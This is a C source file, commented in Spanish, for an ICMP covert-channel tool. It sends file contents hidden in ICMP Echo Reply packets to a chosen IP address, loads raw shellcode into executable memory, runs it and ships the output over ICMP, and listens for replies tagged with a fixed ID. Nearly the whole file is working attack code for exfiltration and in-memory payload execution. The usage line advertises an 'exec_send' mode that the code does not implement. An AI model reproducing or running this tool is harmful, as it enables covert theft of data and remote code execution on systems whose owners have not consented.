#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

#define MAX_PACKET_SIZE 1500
#define ICMP_FILTER_ID 1234

// ===============================
// PROTOTIPOS
// ===============================

enum EstadoListener { OPEN, CLOSE };

unsigned short calcular_checksum(void *b, int len);
int controlar_listener(enum EstadoListener estado);
void *listener_thread(void *arg);
int cargar_payload(const char *ruta, char **buffer_out, int *tam_out);
int enviar_icmp(const char *ip_destino, const char *payload, int payload_size);
int ejecutar_shellcode_remoto(const char *ip_destino, const char *archivo_bin);

// ===============================
// VARIABLES GLOBALES
// ===============================

pthread_t hilo_listener;
int listener_activo = 0;

// ===============================
// FUNCIONES
// ===============================


// Calcula el checksum ICMP (RFC 1071)
unsigned short calcular_checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return ~sum;
}

// Controla el hilo de escucha ICMP (abrir o cerrar)
int controlar_listener(enum EstadoListener estado) {
    if (estado == OPEN && !listener_activo) {
        if (pthread_create(&hilo_listener, NULL, listener_thread, NULL) != 0) {
            perror("[ERROR] No se pudo crear el hilo de escucha");
            return -1;
        }
        listener_activo = 1;
        sleep(1); // Espera breve para iniciar
    } else if (estado == CLOSE && listener_activo) {
        pthread_cancel(hilo_listener);
        pthread_join(hilo_listener, NULL);
        listener_activo = 0;
    }
    return 0;
}

// Hilo que escucha paquetes ICMP tipo 0 y muestra su payload
void *listener_thread(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("[ERROR] No se pudo crear socket RAW receptor");
        pthread_exit(NULL);
    }

    char buffer[MAX_PACKET_SIZE];
    while (1) {
        ssize_t tam = recv(sock, buffer, sizeof(buffer), 0);
        if (tam > 0) {
            struct iphdr *ip = (struct iphdr *)buffer;
            int ip_header_len = ip->ihl * 4;

            if (tam < ip_header_len + sizeof(struct icmphdr)) continue;

            struct icmphdr *icmp = (struct icmphdr *)(buffer + ip_header_len);
            if (icmp->type != ICMP_ECHOREPLY || ntohs(icmp->un.echo.id) != ICMP_FILTER_ID) continue;

            int payload_len = tam - ip_header_len - sizeof(struct icmphdr);
            char *payload = (char *)(buffer + ip_header_len + sizeof(struct icmphdr));

            printf("\n[RECEIVED] Payload (%d bytes):\n", payload_len);
            fwrite(payload, 1, payload_len, stdout);
            printf("\n--------------------------------\n");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Carga un archivo binario a memoria (para enviar o ejecutar)
int cargar_payload(const char *ruta, char **buffer_out, int *tam_out) {
    FILE *f = fopen(ruta, "rb");
    if (!f) {
        perror("[ERROR] No se pudo abrir el archivo binario");
        return -1;
    }

    fseek(f, 0, SEEK_END);
    int tam = ftell(f);
    rewind(f);

    char *buffer = malloc(tam);
    if (!buffer) {
        perror("[ERROR] No hay memoria para el payload");
        fclose(f);
        return -1;
    }

    fread(buffer, 1, tam, f);
    fclose(f);

    *buffer_out = buffer;
    *tam_out = tam;
    return 0;
}

// Envia un payload arbitrario por ICMP tipo 0 (Echo Reply)
int enviar_icmp(const char *ip_destino, const char *payload, int payload_size) {
    if (payload_size + sizeof(struct icmphdr) > MAX_PACKET_SIZE) {
        fprintf(stderr, "[ERROR] Payload demasiado grande\n");
        return -1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("[ERROR] No se pudo crear socket RAW");
        return -1;
    }

    char paquete[MAX_PACKET_SIZE] = {0};
    struct icmphdr *icmp = (struct icmphdr *)paquete;
    char *datos = paquete + sizeof(struct icmphdr);

    memcpy(datos, payload, payload_size);

    icmp->type = ICMP_ECHOREPLY;
    icmp->code = 0;
    icmp->un.echo.id = htons(ICMP_FILTER_ID);
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = 0;
    icmp->checksum = calcular_checksum(icmp, sizeof(struct icmphdr) + payload_size);

    struct sockaddr_in destino = {0};
    destino.sin_family = AF_INET;
    destino.sin_addr.s_addr = inet_addr(ip_destino);

    ssize_t enviados = sendto(sock, paquete, sizeof(struct icmphdr) + payload_size, 0,
                              (struct sockaddr *)&destino, sizeof(destino));

    if (enviados < 0) {
        perror("[ERROR] No se pudo enviar el paquete ICMP");
    } else {
        printf("[ENVIADO] %ld bytes a %s\n", enviados, ip_destino);
    }

    close(sock);
    return 0;
}

// Ejecuta un binario crudo desde memoria, captura su salida y la envia por ICMP
int ejecutar_shellcode_remoto(const char *ip_destino, const char *archivo_bin) {
    char *shellcode = NULL;
    int tam = 0;
    if (cargar_payload(archivo_bin, &shellcode, &tam) != 0) return -1;

    void *mem = mmap(NULL, tam, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("[ERROR] mmap falló");
        free(shellcode);
        return -1;
    }

    memcpy(mem, shellcode, tam);
    free(shellcode);

    int pipefd[2];
    pipe(pipefd);
    pid_t pid = fork();
    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);
        ((void(*)())mem)();
        _exit(0);
    } else {
        close(pipefd[1]);
        char buffer[512];
        ssize_t n = read(pipefd[0], buffer, sizeof(buffer));
        if (n > 0) {
            enviar_icmp(ip_destino, buffer, n);
        }
        close(pipefd[0]);
        munmap(mem, tam);
    }

    return 0;
}

// ===============================
// MAIN
// ===============================

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <send|exec_send|execmem_send> <IP_destino> <archivo>\n", argv[0]);
        return 1;
    }

    controlar_listener(OPEN);

    const char *modo = argv[1];
    const char *ip = argv[2];
    const char *archivo = argv[3];

    if (strcmp(modo, "send") == 0) {
        char *payload = NULL;
        int tam = 0;
        if (cargar_payload(archivo, &payload, &tam) == 0) {
            enviar_icmp(ip, payload, tam);
            free(payload);
        }

    } else if (strcmp(modo, "execmem_send") == 0) {
        ejecutar_shellcode_remoto(ip, archivo);

    } else {
        fprintf(stderr, "[ERROR] Comando no reconocido: %s\n", modo);
    }

    controlar_listener(CLOSE);
    return 0;
}
